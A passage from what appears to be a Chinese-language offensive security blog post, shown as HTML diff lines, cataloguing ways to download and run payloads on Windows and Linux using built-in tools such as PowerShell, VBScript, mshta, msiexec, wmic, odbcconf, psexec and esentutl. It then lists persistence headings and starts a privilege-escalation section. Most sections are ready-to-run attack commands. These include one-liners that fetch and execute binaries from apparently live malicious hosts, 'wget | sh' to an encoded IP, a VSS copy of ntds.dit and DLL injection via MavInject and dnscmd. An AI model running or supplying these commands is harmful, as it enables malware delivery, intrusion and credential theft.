+$p.DownloadFile(&quot;http:&#x2F;&#x2F;domain&#x2F;file&quot; &quot;C:\%homepath%\file&quot;)</code></pre>
+
+<h3 id="4-Visual-Basic-文件下载"><a href="#4-Visual-Basic-文件下载" class="headerlink" title="4. Visual Basic 文件下载"></a>4. Visual Basic 文件下载</h3><pre class="language-none"><code class="language-none">cmd  &#x2F;c \&quot;taskkill &#x2F;f  &#x2F;im wscript.exe&amp;taskkill &#x2F;f  &#x2F;im cscript.exe&amp;echo Set psp &#x3D; CreateObject(\&quot;Msxml2.XMLHTTP\&quot;) &gt; vbsxz.vbs&amp;echo set ws&#x3D;WScript.CreateObject(\&quot;WScript.Shell\&quot;) &gt;&gt; vbsxz.vbs&amp;echo psp.Open \&quot;GET\&quot;,\&quot;http:&#x2F;&#x2F;ym23322.f3322.net:8089&#x2F;gj1jk.exe\&quot;,0 &gt;&gt; vbsxz.vbs&amp;echo psp.Send() &gt;&gt; vbsxz.vbs&amp;echo Set aGet &#x3D; CreateObject(\&quot;ADODB.Stream\&quot;) &gt;&gt; vbsxz.vbs&amp;echo aGet.Mode &#x3D; 3 &gt;&gt; vbsxz.vbs&amp;echo aGet.Type &#x3D; 1 &gt;&gt; vbsxz.vbs&amp;echo aGet.Open() &gt;&gt; vbsxz.vbs&amp;echo aGet.Write(psp.responseBody) &gt;&gt; vbsxz.vbs&amp;echo aGet.SaveToFil</code></pre>
+
+<h3 id="5-Perl-文件下载"><a href="#5-Perl-文件下载" class="headerlink" title="5. Perl 文件下载"></a>5. Perl 文件下载</h3><ol>
+<li>perl -e 命令行直接执行</li>
+</ol>
+<pre class="language-none"><code class="language-none">perl -e use warnings;use strict; my($cmd, $plm) &#x3D; (\&quot;wget -qO - http:&#x2F;&#x2F;\\x36\\x35\\x2E\\x32\\x35\\x34\\x2E\\x36\\x33\\x2E\\x320&#x2F;a | sh ; curl -O http:&#x2F;&#x2F;\\x36\\x35\\x2E\\x32\\x35\\x34\\x2E\\x36\\x33\\x2E\\x320&#x2F;a ; sh a ; rm -rf a\&quot;, \&quot;httpd.conf\&quot;) ; if (&#96;ps x|grep $plm|grep -v grep&#96; ) &#123;print \&quot;merge\\n\&quot;;&#125; else &#123;&#96;$cmd &amp;&#96;&#125;;</code></pre>
+
+<ol start="2">
+<li>写入到 .pl 文件中解析执行</li>
+</ol>
+<h3 id="6-Python-文件下载"><a href="#6-Python-文件下载" class="headerlink" title="6. Python 文件下载"></a>6. Python 文件下载</h3><ol>
+<li>写入.py 文件中解析执行</li>
+</ol>
+<pre class="language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python
+import urllib2
+u &#x3D; urllib2.urlopen(&#39;https:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;EBPsTBLt&#39;)
+localFile &#x3D; open(&#39;EBPsTBLt.txt&#39;, &#39;w&#39;)
+localFile.write(u.read())
+localFile.close()</code></pre>
+
+<ol start="2">
+<li>python -c 命令行直接执行</li>
+</ol>
+<pre class="language-none"><code class="language-none">python -c &quot;import urllib2; u &#x3D; urllib2.urlopen(&#39;https:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;EBPsTBLt&#39;); localFile &#x3D; open(&#39;EBPsTBLt.txt&#39;, &#39;w&#39;); localFile.write(u.read()); localFile.close();&quot;</code></pre>
+
+<h3 id="7-Ruby-文件下载"><a href="#7-Ruby-文件下载" class="headerlink" title="7. Ruby 文件下载"></a>7. Ruby 文件下载</h3><pre class="language-none"><code class="language-none">#!ruby
+#!&#x2F;usr&#x2F;bin&#x2F;ruby
+require &#39;net&#x2F;http&#39;
+Net::HTTP.start(&quot;https:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;EBPsTBLt&quot;) &#123; |http|
+r &#x3D; http.get(&quot;&#x2F;file&quot;)
+open(&quot;save_location&quot;, &quot;wb&quot;) &#123; |file|
+file.write(r.body)
+&#125;
+&#125;</code></pre>
+
+<h3 id="8-PHP-文件下载"><a href="#8-PHP-文件下载" class="headerlink" title="8. PHP 文件下载"></a>8. PHP 文件下载</h3><pre class="language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;php
+&lt;?php
+        $data &#x3D; @file(&quot;http:&#x2F;&#x2F;example.com&#x2F;file&quot;);
+        $lf &#x3D; &quot;local_file&quot;;
+        $fh &#x3D; fopen($lf, &#39;w&#39;);
+        fwrite($fh, $data[0]);
+        fclose($fh);
+?&gt;</code></pre>
+
+<h3 id="9-FTP-文件下载"><a href="#9-FTP-文件下载" class="headerlink" title="9. FTP 文件下载"></a>9. FTP 文件下载</h3><p>通过FTP下载文件需要完成一系列交互动作，一般选择将所有代码打包在一个bat文件中，自动化批量执行</p>
+<pre class="language-none"><code class="language-none">cmd &#x2F;c echo open ftp.ftp0118.info&gt;ps&amp;echo test&gt;&gt;ps&amp;echo 1433&gt;&gt;ps&amp;echo get s.rar c:\\windows\\help\\lsmosee.exe&gt;&gt;ps&amp;echo bye&gt;&gt;ps&amp;ftp -s:ps</code></pre>
+
+<h3 id="10-Netcat-文件下载"><a href="#10-Netcat-文件下载" class="headerlink" title="10. Netcat 文件下载"></a>10. Netcat 文件下载</h3><p>可借助nc直接实现文件流的下载</p>
+<p>攻击机输入：</p>
+<pre class="language-none"><code class="language-none">cat 1.pl | nc -l 1234   &#x2F;&#x2F; 将file的内容输出到本地的1234端口中，当连接此端口，file的内容将会发送到连接过来的IP</code></pre>
+
+<p>目标机命令：</p>
+<pre class="language-none"><code class="language-none">nc 112.124.118.108 1234 &gt; file  &#x2F;&#x2F; 这条命令将连接攻击者的电脑，接受file内容保存</code></pre>
+
+<h3 id="11-通过NET-USE建立IPC通道从远程共享服务器下载文件"><a href="#11-通过NET-USE建立IPC通道从远程共享服务器下载文件" class="headerlink" title="11. 通过NET USE建立IPC通道从远程共享服务器下载文件"></a>11. 通过NET USE建立IPC通道从远程共享服务器下载文件</h3><pre class="language-none"><code class="language-none">net use f: \\IP\c$ &quot;密码&quot; &#x2F;user:&quot;帐号&quot;    &#x2F;&#x2F; 将对方的c盘映射为自己的f盘  </code></pre>
+
+<h3 id="12-windows-installer安装包植入程序"><a href="#12-windows-installer安装包植入程序" class="headerlink" title="12. windows installer安装包植入程序"></a>12. windows installer安装包植入程序</h3><p><strong>1) 上传msi文件，本地启动</strong></p>
+<p>msiexec是系统进程，是Windows Installer的一部分，用于安装Windows Installer安装包（MSI）</p>
+<p>可将要植入的恶意程序打包制作为一个 .msi 文件</p>
+<p>使用metasploit来生成包含payload的msi安装包程序，MSF为了能够让payload可扩展，生成msi文件的方式如下：</p>
+<pre class="language-none"><code class="language-none">msfvenom -f msi -p windows&#x2F;exec CMD&#x3D;calc.exe&gt;test.msi</code></pre>
+
+<p>运行后生成test.msi，双击可以直接安装</p>
+<p>可以使用&#x2F;q参数来隐藏安装界面</p>
+<pre class="language-none"><code class="language-none">msiexec &#x2F;q &#x2F;i test.msi</code></pre>
+
+<p><strong>2) 远程下载执行msi文件</strong></p>
+<p>将自己开发的msi文件上传到服务器，通过如下命令远程执行：</p>
+<pre class="language-none"><code class="language-none">msiexec &#x2F;q &#x2F;i https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;test&#x2F;master&#x2F;test3.msi</code></pre>
+
+<h3 id="13-mshta-代码执行"><a href="#13-mshta-代码执行" class="headerlink" title="13. mshta 代码执行"></a>13. mshta 代码执行</h3><p><strong>1) 执行内嵌html代码</strong></p>
+<pre class="language-none"><code class="language-none"># 执行vbscript代码
+mshta vbscript:msgbox(&quot;hacked by littlehann!&quot;,64,&quot;notice&quot;)(window.close) 
+mshta vbscript:CreateObject(&quot;Wscript.Shell&quot;).popup(&quot;hacked by littlehann!&quot;,7,&quot;notice&quot;,64)(window.close) 
+mshta vbscript:execute(&quot;msgbox &quot;&quot;hacked by littlehann!&quot;&quot;:window.close&quot;) 
+
+# 执行jscript代码
+mshta javascript:window.execScript(&quot;alert(&#39;hello world!&#39;);&quot;,&quot;javascript&quot;) </code></pre>
+
+<p><strong>2) 解析执行html网页response</strong></p>
+<p>mshta支持http和htpps，但mshta在执行hta脚本时，类似于浏览器，会根据链接返回头进行对应的解析操作，所以这里只有当返回头指定类型为html时才会运行，否则会被当普通文本进行解析。</p>
+<p>例如对于github的代码，返回的格式为text&#x2F;plain，如果使用如下命令执行：</p>
+<pre class="language-none"><code class="language-none">mshta https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;test&#x2F;master&#x2F;calc.hta</code></pre>
+
+<p>会把代码当成text，无法解析成html，导致脚本无法执行</p>
+<p>但可以换一个思路，将hta文件传到github的博客下面，就能够被解析成html（本质上可以用任何方法，只要webserver返回的content-type是text&#x2F;html即可），实现代码执行</p>
+<pre class="language-none"><code class="language-none">mshta https:&#x2F;&#x2F;3gstudent.github.io&#x2F;test&#x2F;calc.hta</code></pre>
+
+<h3 id="14-利用系统原生组件加载DLL"><a href="#14-利用系统原生组件加载DLL" class="headerlink" title="14. 利用系统原生组件加载DLL"></a>14. 利用系统原生组件加载DLL</h3><p><strong>1) odbcconf</strong></p>
+<p>ODBCCONF.exe是一个命令行工具，它允许配置ODBC驱动程序和数据源名称，同时它允许我们指定特殊结构的DLL来进行相应动作</p>
+<pre class="language-none"><code class="language-none"># odbcconf-x64.dll中主要是创建一个交互式的PowerShell。
+odbcconf.exe &#x2F;s &#x2F;A &#123;REGSVR odbcconf-x64.dll&#125; 
+
+# 不一定需要.dll的后缀名文件。
+odbcconf.exe &#x2F;s &#x2F;A &#123;REGSVR odbcconf-x64.txt&#125; 
+
+# odbcconf.config的内容填写我们希望加载的DLL文件 
+odbcconf.exe &#x2F;s &#x2F;F odbcconf.config(后缀名可以随意) 
+odbcconf.exe &#x2F;S &#x2F;Lv odbcconf.log &#x2F;F C:\Windows\system32\redist.rsp 
+
+# Load DLL specified in target .RSP file. See the Playloads folder for an example .RSP file. 
+odbcconf -f file.rsp 
+
+# Execute DllREgisterServer from DLL specified. 
+odbcconf &#x2F;a &#123;REGSVR c:\test\test.dll&#125; </code></pre>
+
+<p><strong>2) 使用tracker加载dll</strong></p>
+<pre class="language-none"><code class="language-none">Tracker.exe [选项] [@跟踪器响应文件] &#x2F;c [命令行]
+ &#x2F;d 文件.dll                : 使用跟踪 dll 文件.dll 启动进程。(默认值: 通过 PATH 提供的 FileTracker.dll)
+ &#x2F;i[f] &lt;路径&gt;               :  用于跟踪日志输出的中间目录。(使用 &#x2F;if 可立即将路径展开为完整路径)(默认值: 所跟踪进程中的当前目录)
+ &#x2F;o                         : 对每个文件执行跟踪操作
+ &#x2F;m                         : 在跟踪日志中包含缺少的文件，即在进程关闭之前删除的那些文件
+ &#x2F;u                         : 不从跟踪日志中删除重复的文件操作
+ &#x2F;t                         : 跟踪命令行(将展开使用“@文件名”语法指定的响应文件)
+ &#x2F;a                         : 启用扩展跟踪: GetFileAttributes、GetFileAttributesEx
+ &#x2F;e                         : 启用扩展跟踪: GetFileAttributes、GetFileAttributesEx、RemoveDirectory、CreateDirectory
+ &#x2F;k                         : 在跟踪日志文件名中保留完整的工具链
+ &#x2F;r 文件 1;文件 2;..;文件 n : 正在跟踪的主要根输入文件(默认值: 无)
+ &#x2F;c [命令行]                : 要跟踪的命令(必须是最后一个参数)
+ &#x2F;?                         : 本帮助文本</code></pre>
+
+<p>dll需要实现基本的接口函数</p>
+<pre class="language-none"><code class="language-none">#include &quot;stdafx.h&quot;
+#include &lt;windows.h&gt;
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+           )
+&#123;
+  switch (ul_reason_for_call)
+  &#123;
+  case DLL_PROCESS_ATTACH:
+    MessageBox(NULL,L&quot;testexport&quot;, L&quot;testexport&quot;,MB_OK);
+  case DLL_THREAD_ATTACH:
+  case DLL_THREAD_DETACH:
+  case DLL_PROCESS_DETACH:
+    break;
+  &#125;
+  return TRUE;
+&#125;</code></pre>
+
+<p>cmd下运行：</p>
+<pre class="language-none"><code class="language-none">Tracker.exe &#x2F;d test.dll &#x2F;c cmd.exe</code></pre>
+
+<p>特点：</p>
+<pre class="language-none"><code class="language-none">1. tracker.exe包含微软数字签名，可绕过应用程序白名单的限制
+2. tracker.exe可以在启动进程的同时加载dll
+3. 如果只限注入dll，可以通过一个特殊的进程来解决这个问题，如svchost.exe，那么在加载dll后，进程svchost.exe可以自动退出,这就实现了通过tracker.exe加载dll</code></pre>
+
+<h3 id="15-利用wmic执行程序"><a href="#15-利用wmic执行程序" class="headerlink" title="15. 利用wmic执行程序"></a>15. 利用wmic执行程序</h3><p><strong>1) 使用wmic创建进程执行程序</strong></p>
+<pre class="language-none"><code class="language-none">wmic.exe process call create calc
+# Execute calc.exe.
+
+wmic.exe process call create &quot;c:\ads\file.txt:program.exe&quot;
+# Execute a .EXE file stored as an Alternate Data Stream (ADS).</code></pre>
+
+<p><strong>2) 使用wmi向远程主机执行指令</strong></p>
+<pre class="language-none"><code class="language-none">wmic &#x2F;node:192.168.1.158 &#x2F;user:pt007 &#x2F;password:admin123  process call create &quot;cmd.exe &#x2F;c ipconfig&gt;d:\result.txt&quot;</code></pre>
+
+<p><strong>3) 解析并执行XSL内的jscript&#x2F;vbscript代码</strong></p>
+<pre class="language-none"><code class="language-none">wmic.exe process get brief &#x2F;format:&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;api0cradle&#x2F;LOLBAS&#x2F;master&#x2F;OSBinaries&#x2F;Payload&#x2F;Wmic_calc.xsl&quot;
+# Execute a script contained in the target .XSL file hosted on a remote server.
+
+wmic.exe os get &#x2F;format:&quot;MYXSLFILE.xsl&quot;
+# Executes JScript or VBScript embedded in the target XSL stylesheet.
+
+wmic.exe process get brief &#x2F;format:&quot;\\127.0.0.1\c$\Tools\pocremote.xsl&quot;
+# Executes JScript or VBScript embedded in the target remote XSL stylsheet.</code></pre>
+
+<h3 id="16-利用系统原生脚本执行指令"><a href="#16-利用系统原生脚本执行指令" class="headerlink" title="16. 利用系统原生脚本执行指令"></a>16. 利用系统原生脚本执行指令</h3><p><strong>1) Pubprn.vbs</strong></p>
+<p>在Windows 7以后系统中，微软有一个名为PubPrn.vbs的WSH脚本，其中使用了GetObject()，并且参数可控，我么可以向其传入script脚本的路径，进行WSH注入攻击</p>
+<pre class="language-none"><code class="language-none">C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 javascript:https:&#x2F;&#x2F;gist.githubusercontent.com&#x2F;api0cradle&#x2F;fb164762143b1ff4042d9c662171a568&#x2F;raw&#x2F;709aff66095b7f60e5d6f456a5e42021a95ca802&#x2F;test.sct</code></pre>
+
+<p><strong>2) CL_Invocation.ps1</strong></p>
+<p>windows自带的诊断工具，可以执行exe文件</p>
+<pre class="language-none"><code class="language-none">PS C:\&gt; . C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1
+PS C:\&gt; SyncInvoke cmd.exe &quot;&#x2F;c ipconfig &gt; E:\ip.txt&quot;</code></pre>
+
+<p><strong>3) slmgr.vbs&#x2F;winrm.vbs</strong></p>
+<pre class="language-none"><code class="language-none"># Hijack the Scripting.Dictionary COM Object to execute remote scriptlet (SCT) code
+reg.exe import c:\path\to\Slmgr.reg &amp; cscript.exe &#x2F;b c:\windows\system32\slmgr.vbs
+cscript.exe &#x2F;b c:\windows\system32\slmgr.vbs</code></pre>
+
+<h3 id="17-通过-x2F-tcp-x2F-tcp下载文件"><a href="#17-通过-x2F-tcp-x2F-tcp下载文件" class="headerlink" title="17. 通过&#x2F;tcp&#x2F;tcp下载文件"></a>17. 通过&#x2F;tcp&#x2F;tcp下载文件</h3><pre class="language-none"><code class="language-none">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;sec-lab.org&#x2F;80 &amp;&amp;echo -e “GET &#x2F;c.pl HTTP&#x2F;1.0\n” &gt;&amp;5 &amp;&amp; cat&lt;&amp;5 &gt; c.pl</code></pre>
+
+<p>本质上还是通过http方式下载文件，直接通过原生的linux &#x2F;proc&#x2F;tcp建立tcp session通道后，发送http request请求头，实现文件下载功能</p>
+<h3 id="18-利用psexec远程执行指令"><a href="#18-利用psexec远程执行指令" class="headerlink" title="18. 利用psexec远程执行指令"></a>18. 利用psexec远程执行指令</h3><p>PsExec 是一个轻型的 telnet 替代工具，无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与控制台应用程序相当的完全交互性。PsExec 最强大的功能之一是在远程系统和远程支持工具（如 IpConfig）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。 </p>
+<p>参数：</p>
+<pre class="language-none"><code class="language-none">用法：psexec [\\computer[,computer2[,...] | @file][-u user [-p psswd]][-n s][-l][-s|-e][-x][-i [session]][-c [-f|-v]][-w directory][-d][-][-a n,n,...] cmd [arguments]</code></pre>
+
+<p><strong>1) 直接向远程受害者服务器拷贝文件</strong></p>
+<pre class="language-none"><code class="language-none">psexec \\marklap -c test.exe</code></pre>
+
+<p><strong>2) 利用远程服务器上的下载工具进行恶意软件的下载</strong></p>
+<pre class="language-none"><code class="language-none">psexec \\marklap ipconfig &#x2F;all
+
+# 通过 &#x2F;all 开关在远程系统上执行 IpConfig，并在本地显示输出结果</code></pre>
+
+<h3 id="19-利用sc定时任务执行指令"><a href="#19-利用sc定时任务执行指令" class="headerlink" title="19. 利用sc定时任务执行指令"></a>19. 利用sc定时任务执行指令</h3><pre class="language-none"><code class="language-none"># 向远程主机执行指令
+sc \\192.168.17.138 create test binpath&#x3D; &quot;c:\test.exe&quot;
+sc \\192.168.17.138 start test
+
+# 本机执行指令
+sc create test binpath&#x3D; &quot;c:\test.exe&quot;
+sc start test</code></pre>
+
+<h3 id="20-利用Esentutl-exe实现文件拷贝及远程文件下载"><a href="#20-利用Esentutl-exe实现文件拷贝及远程文件下载" class="headerlink" title="20. 利用Esentutl.exe实现文件拷贝及远程文件下载"></a>20. 利用Esentutl.exe实现文件拷贝及远程文件下载</h3><pre class="language-none"><code class="language-none"># Copies the source VBS file to the destination VBS file.
+esentutl.exe &#x2F;y C:\folder\sourcefile.vbs &#x2F;d C:\folder\destfile.vbs &#x2F;o
+
+# Copies a (locked) file using Volume Shadow Copy
+esentutl.exe &#x2F;y &#x2F;vss c:\windows\ntds\ntds.dit &#x2F;d c:\folder\ntds.dit
+
+# Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.
+esentutl.exe &#x2F;y C:\ADS\file.exe &#x2F;d c:\ADS\file.txt:file.exe &#x2F;o
+
+# Copies the source Alternate Data Stream (ADS) to the destination EXE.
+esentutl.exe &#x2F;y C:\ADS\file.txt:file.exe &#x2F;d c:\ADS\file.exe &#x2F;o
+
+# Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.
+esentutl.exe &#x2F;y \\192.168.100.100\webdav\file.exe &#x2F;d c:\ADS\file.txt:file.exe &#x2F;o
+
+# Copies the source EXE to the destination EXE file
+esentutl.exe &#x2F;y \\live.sysinternals.com\tools\adrestore.exe &#x2F;d \\otherwebdavserver\webdav\adrestore.exe &#x2F;o</code></pre>
+
+<h3 id="21-利用UNC机制从远程下载文件"><a href="#21-利用UNC机制从远程下载文件" class="headerlink" title="21. 利用UNC机制从远程下载文件"></a>21. 利用UNC机制从远程下载文件</h3><pre class="language-none"><code class="language-none"># Copy the source file to the destination file and overwrite it.
+extrac32 &#x2F;Y &#x2F;C \\webdavserver\share\test.txt C:\folder\test.txt
+
+# Searches for the string W3AllLov3DonaldTrump, since it does not exist (&#x2F;V) file.exe is downloaded to the target file.
+findstr &#x2F;V &#x2F;L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe &gt; c:\ADS\file.exe</code></pre>
+
+<h3 id="22-利用第三方程序执行系统指令"><a href="#22-利用第三方程序执行系统指令" class="headerlink" title="22. 利用第三方程序执行系统指令"></a>22. 利用第三方程序执行系统指令</h3><p><strong>1) FTP</strong></p>
+<pre class="language-none"><code class="language-none"># 指定包含 FTP 命令的文本文件；命令
+ftp -s:filename
+
+# ftp指令
+echo open 192.168.1.123 21 &gt; ftp.txt
+
+# 匿名登录或通过帐号密码登录
+echo ftp &gt;&gt; ftp.txt
+echo bin &gt;&gt; ftp.txt
+echo ftp&gt;&gt; ftp.txt
+echo GET virus_filename.exe &gt;&gt; ftp.txt
+ftp -s:ftp.txt</code></pre>
+
+<p><strong>2) Pcalua</strong></p>
+<p>Windows程序兼容性助理(Program Compatibility Assistant)的一个组件，通过-a参数可以直接执行exe或者dll</p>
+<pre class="language-none"><code class="language-none">C:\windows\system32\pcalua.exe -a C:\file.lnk 
+C:\windows\system32\pcalua.exe -a notepad.exe 
+C:\windows\system32\pcalua.exe -a \\server\payload.dll</code></pre>
+
+<p><strong>3) MavInject32</strong></p>
+<p>MavInject32.exe是微软应用程序虚拟化的一部分，可以直接完成向某一进程注入代码</p>
+<pre class="language-none"><code class="language-none">&quot;C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe&quot; &lt;PID&gt; &#x2F;INJECTRUNNING &lt;PATH DLL&gt;</code></pre>
+
+<p><strong>4) Forfiles</strong></p>
+<p>Forfiles一个选择并对文件或文件集执行命令的工具。 此命令可用于批处理。但是这里的批处指令实际上就是windows bat指令，即可执行任意指令</p>
+<pre class="language-none"><code class="language-none">forfiles &#x2F;p c:\windows\system32 &#x2F;m notepad.exe &#x2F;c notepad.exe
+
+forfiles.exe &#x2F;c calc.exe</code></pre>
+
+<p><strong>5) 利用IEEXC命令下载执行</strong></p>
+<pre class="language-none"><code class="language-none"># IEExec.exe只在.NET 2.0内才有
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\&gt; caspol -s off
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\&gt; IEExec http:&#x2F;&#x2F;site.com&#x2F;files&#x2F;test64.exe</code></pre>
+
+<p><strong>6) 利用Dnscmd注入dll</strong></p>
+<pre class="language-none"><code class="language-none"># Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.
+dnscmd.exe dc1.lab.int &#x2F;config &#x2F;serverlevelplugindll \\192.168.0.149\dll\wtf.dll</code></pre>
+
+<p><strong>7) Winword.exe</strong></p>
+<pre class="language-none"><code class="language-none"># Downloads payload from remote server
+winword.exe &quot;http:&#x2F;&#x2F;192.168.1.10&#x2F;TeamsAddinLoader.dll&quot;</code></pre>
+
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-download-a-file/#windows">https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-download-a-file/#windows</a></li>
+</ul>
+<h2 id="0x03-持久化-Persistence"><a href="#0x03-持久化-Persistence" class="headerlink" title="0x03 持久化(Persistence)"></a>0x03 持久化(Persistence)</h2><h3 id="1-登录后门"><a href="#1-登录后门" class="headerlink" title="1. 登录后门"></a>1. 登录后门</h3><h3 id="2-注册表后门"><a href="#2-注册表后门" class="headerlink" title="2. 注册表后门"></a>2. 注册表后门</h3><h3 id="3-身份认证接口后门"><a href="#3-身份认证接口后门" class="headerlink" title="3. 身份认证接口后门"></a>3. 身份认证接口后门</h3><h3 id="4-bitadmins实现自启动"><a href="#4-bitadmins实现自启动" class="headerlink" title="4. bitadmins实现自启动"></a>4. bitadmins实现自启动</h3><h3 id="5-tscon实现远程登录"><a href="#5-tscon实现远程登录" class="headerlink" title="5. tscon实现远程登录"></a>5. tscon实现远程登录</h3><h3 id="6-添加系统自启动项实现持久化"><a href="#6-添加系统自启动项实现持久化" class="headerlink" title="6. 添加系统自启动项实现持久化"></a>6. 添加系统自启动项实现持久化</h3><h3 id="7-辅助功能镜像劫持实现持久化"><a href="#7-辅助功能镜像劫持实现持久化" class="headerlink" title="7. 辅助功能镜像劫持实现持久化"></a>7. 辅助功能镜像劫持实现持久化</h3><h3 id="8-利用-AppCertDlls-注册表项实现进程启动dll注入持久化"><a href="#8-利用-AppCertDlls-注册表项实现进程启动dll注入持久化" class="headerlink" title="8. 利用 AppCertDlls 注册表项实现进程启动dll注入持久化"></a>8. 利用 AppCertDlls 注册表项实现进程启动dll注入持久化</h3><h3 id="9-利用-AppInit-DLLs-注册表项实现针对加载user32-dll的进程注入持久化"><a href="#9-利用-AppInit-DLLs-注册表项实现针对加载user32-dll的进程注入持久化" class="headerlink" title="9. 利用 AppInit DLLs 注册表项实现针对加载user32.dll的进程注入持久化"></a>9. 利用 AppInit DLLs 注册表项实现针对加载user32.dll的进程注入持久化</h3><h3 id="10-利用-BITS-Jobs-实现持久化后门任务"><a href="#10-利用-BITS-Jobs-实现持久化后门任务" class="headerlink" title="10. 利用 BITS Jobs 实现持久化后门任务"></a>10. 利用 BITS Jobs 实现持久化后门任务</h3><h3 id="11-利用-Com组件劫持-实现持久化"><a href="#11-利用-Com组件劫持-实现持久化" class="headerlink" title="11. 利用 Com组件劫持 实现持久化"></a>11. 利用 Com组件劫持 实现持久化</h3><h3 id="12-Winlogon-实现持久化"><a href="#12-Winlogon-实现持久化" class="headerlink" title="12. Winlogon 实现持久化"></a>12. Winlogon 实现持久化</h3><h3 id="13-篡改服务进程实现持久化"><a href="#13-篡改服务进程实现持久化" class="headerlink" title="13. 篡改服务进程实现持久化"></a>13. 篡改服务进程实现持久化</h3><h3 id="14-替换屏幕保护程序实现持久化"><a href="#14-替换屏幕保护程序实现持久化" class="headerlink" title="14. 替换屏幕保护程序实现持久化"></a>14. 替换屏幕保护程序实现持久化</h3><h3 id="15-利用WMI事件订阅实现持久化"><a href="#15-利用WMI事件订阅实现持久化" class="headerlink" title="15. 利用WMI事件订阅实现持久化"></a>15. 利用WMI事件订阅实现持久化</h3><h3 id="16-创建新服务实现持久化"><a href="#16-创建新服务实现持久化" class="headerlink" title="16. 创建新服务实现持久化"></a>16. 创建新服务实现持久化</h3><h3 id="17-利用-NetshHelper-DLL-实现持久化"><a href="#17-利用-NetshHelper-DLL-实现持久化" class="headerlink" title="17. 利用 NetshHelper DLL 实现持久化"></a>17. 利用 NetshHelper DLL 实现持久化</h3><h2 id="0x04-权限提升-Privilege-Escalation"><a href="#0x04-权限提升-Privilege-Escalation" class="headerlink" title="0x04 权限提升(Privilege Escalation)"></a>0x04 权限提升(Privilege Escalation)</h2><h3 id="1-通过服务创建提权"><a href="#1-通过服务创建提权" class="headerlink" title="1. 通过服务创建提权"></a>1. 通过服务创建提权</h3><p>介绍几种从admin权限提权到system权限的方法，本质上是采用了“劫持启动”的思想，通过创建一个系统任务，劫持系统以一个system权限来执行任意的目的</p>
 <p><strong>1）使用sc命令</strong></p>
 <pre class="language-none"><code class="language-none">sc Create TestService1 binPath&#x3D; &quot;cmd &#x2F;c start&quot; type&#x3D; own type&#x3D; interact
 sc start TestService1</code></pre>
